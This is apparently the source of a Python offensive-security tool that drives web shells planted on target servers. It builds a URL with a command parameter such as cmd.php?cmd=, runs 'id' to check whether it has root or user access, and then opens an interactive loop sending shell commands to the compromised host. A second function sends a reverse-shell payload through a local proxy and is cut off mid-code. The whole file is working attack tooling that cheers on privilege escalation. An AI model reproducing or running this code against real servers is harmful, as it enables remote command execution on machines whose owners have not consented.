from shelter.helpers.stylize import *

import requests
import re

def Invoke_Weburl_prepare(url,ssl=False,nossl=False,param="?cmd=",file="cmd.php"):
    if not bool(re.match("^http://|https://",url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",url)):
        if ssl and nossl:
            aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
            exit()
        elif ssl:
            url = "https://" + url
        elif nossl or not ssl and not nossl:
            url = "http://" + url
    if bool(re.match("^http://|https://",url)): # Checks whether http or https is present in the url entered.
        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
            url += "/"
        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
                if file == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
                    url += "cmd.php"
                elif file != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
                    url += file
            if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",url)): # Checks if the url has the parameter present else injects ?cmd= or the data added with -p flag.
                if param == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
                    url += "?cmd="
                elif param != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
                    url += f"?{param}="
    # The url is prepared for doing whatever we want to do.
    return url

def Invoke_Webshell(url): # This will invoke a webshell when a url with param is given like http://127.0.0.1/rev.php?cmd=
    try:   # Here it checks wether the site is available or not
        r = requests.get(f"{url}")
        if "404" in r.text or "Not Found" in r.text: # Added check if the named site is not available which returns not found by webserver.
            aerr(f"Fatal Error : 404 Page not found.")
            exit()
    except requests.ConnectionError: # If the site is unavailable it will return an 404.
        aerr(f"Fatal Error : 404 Page not found.")
        exit()
    # We only reach here after the availablity check is complete.
    # This means from here the site is available and we are ready to rock and roll.
    r = requests.get(f"{url}id") # The webshell will issue id and the response isstored in r
    uid = int(re.findall("[0-9]+",r.text)[0]) # We do some regex magic and grad out the uid and gid values seperately.
    user = r.text.rstrip().split("(")[1].split(")")[0] # We take out the the username and primary group name here.
    if "root" in user or uid == 0: # We check for root and then display a colourful messaage.
        ap(f"{red}{bold}root{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold} WebShell opened.{end}")
        ap(f"Wait!! What we are {red}{bold}root{end}")
    else:
        if uid > 0 and uid < 1000 : # We check for the account whether it is a service account. Generally service accounts have a uid gid from greater than 0 and less than 1000
            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Service Account{end}] WebShell opened{end}.")
            ap("Good Luck!!! Happy Privilege Escation...")
        elif uid > 1000: # We check for the account whether it is a Regular user of the box.
            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Regular User{end}] WebShell opened{end}.")
            ap("Good Luck!!! Happy Privilege Escation...")
    try : 
        while True:
            cmd = input(f"{bold}{purple}web{green}shelter> {end}{bold}{orange}") # Takes input from the user and sends the command to the user.
            if cmd.lower() == "exit" or cmd.lower() == "quit": # Added the function to exit the webshell on entering quit or exit.
                print()
                ainfo("KTHXBYE!")
                exit()
            print(f"{end}",end="")
            r = requests.get(f"{url}{requests.utils.quote(cmd)}") # It will send the url encoded command and url encoded to the url as a GET parameter.
            print(r.text.rstrip()) # We print the response of the command on the screen while removing a extra trailling line sing rstrip.
    except KeyboardInterrupt:
        aerr(f"{end}{bold}{red} Hey, that's rude. Don't you know Hooman, computers too have feelings...")

def Invoke_Revshell(url,language):
    proxies = {
  'https': 'https://127.0.0.1:8080',
}
    try:   # Here it checks wether the site is available or not
        r = requests.get(f"{url}")
        if "404" in r.text or "Not Found" in r.text: # Added check if the named site is not available which returns not found by webserver.
            aerr(f"Fatal Error : 404 Page not found.")
            exit()
    except requests.ConnectionError: # If the site is unavailable it will return an 404.
        aerr(f"Fatal Error : 404 Page not found.")
        exit()
    ap(f"Sending payload {language}")
    try:
        # r = requests.get(f"{url}{requests.utils.quote(language)}",proxies=proxies)
        r = requests.get(f"{url}{requests.utils.quote(language)}",proxies=proxies)
    except requests.Timeout:
        return